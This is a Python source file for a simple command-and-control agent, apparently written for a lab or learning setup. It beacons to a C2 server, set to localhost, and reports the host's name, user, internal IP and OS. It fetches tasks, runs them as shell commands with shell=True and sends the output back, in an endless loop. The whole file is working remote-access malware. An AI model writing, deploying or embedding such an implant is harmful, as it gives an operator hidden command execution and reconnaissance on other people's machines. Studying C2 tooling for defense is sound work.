"""
Simple C2 Agent

This agent:
1. Beacons to C2 server every 60 seconds
2. Fetches pending tasks
3. Executes tasks
4. Returns results
"""

import requests
import time
import uuid
import platform
import socket
import subprocess
import os

# ============================================
# CONFIGURATION
# ============================================
C2_SERVER = "http://localhost:8000/api/v1/agents"
AGENT_ID = str(uuid.uuid4())[:8]  # Generate unique ID
SLEEP_INTERVAL = 10  # Beacon every 10 seconds (fast for testing)


# ============================================
# SYSTEM INFORMATION
# ============================================
def get_system_info():
    """Collect system information"""
    return {
        "agent_id": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'unknown'),
        "internal_ip": socket.gethostbyname(socket.gethostname()),
        "os": f"{platform.system()} {platform.release()}",
        "architecture": platform.machine()
    }


# ============================================
# TASK EXECUTION
# ============================================
def execute_task(task):
    """
    Execute a task based on its type.
    
    Returns: (output, error, execution_time)
    """
    task_type = task["task_type"]
    command = task["command"]
    
    print(f"  📋 Executing: {task_type} - {command}")
    
    start_time = time.time()
    
    try:
        if task_type == "shell":
            # Execute shell command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout
            error = result.stderr if result.returncode != 0 else None
            
        else:
            # Unsupported task type
            output = None
            error = f"Unsupported task type: {task_type}"
    
    except subprocess.TimeoutExpired:
        output = None
        error = "Command timed out after 30 seconds"
    
    except Exception as e:
        output = None
        error = str(e)
    
    execution_time = time.time() - start_time
    
    return output, error, execution_time


# ============================================
# MAIN LOOP
# ============================================
def main():
    """Main agent loop"""
    
    print("=" * 60)
    print("C2 AGENT STARTING")
    print("=" * 60)
    print(f"Agent ID: {AGENT_ID}")
    print(f"C2 Server: {C2_SERVER}")
    print(f"System: {platform.system()} {platform.release()}")
    print(f"Hostname: {socket.gethostname()}")
    print("=" * 60)
    print()
    
    while True:
        try:
            # STEP 1: Beacon to C2 server
            print(f"📡 Beaconing to C2 server...")
            
            system_info = get_system_info()
            response = requests.post(
                f"{C2_SERVER}/beacon",
                json=system_info,
                timeout=5
            )
            
            if response.status_code != 200:
                print(f"  ❌ Error: Server returned {response.status_code}")
                time.sleep(SLEEP_INTERVAL)
                continue
            
            data = response.json()
            print(f"  ✅ Connected")
            
            # STEP 2: Check for tasks
            tasks = data.get("tasks", [])
            
            if len(tasks) == 0:
                print(f"  💤 No tasks")
            else:
                print(f"  📬 Received {len(tasks)} task(s)")
                
                # STEP 3: Execute each task
                for task in tasks:
                    output, error, execution_time = execute_task(task)
                    
                    # STEP 4: Submit result
                    result_data = {
                        "task_id": task["id"],
                        "agent_id": AGENT_ID,
                        "output": output,
                        "error": error,
                        "execution_time": execution_time
                    }
                    
                    result_response = requests.post(
                        f"{C2_SERVER}/results",
                        json=result_data,
                        timeout=5
                    )
                    
                    if result_response.status_code == 200:
                        print(f"  ✅ Result sent")
                    else:
                        print(f"  ❌ Failed to send result")
            
        except requests.exceptions.ConnectionError:
            print(f"  ❌ Cannot connect to C2 server")
        except requests.exceptions.Timeout:
            print(f"  ❌ Connection timeout")
        except Exception as e:
            print(f"  ❌ Error: {e}")
        
        # STEP 5: Sleep before next beacon
        print(f"  😴 Sleeping {SLEEP_INTERVAL} seconds...")
        print()
        time.sleep(SLEEP_INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🛑 Agent stopped by user")
        print("=" * 60)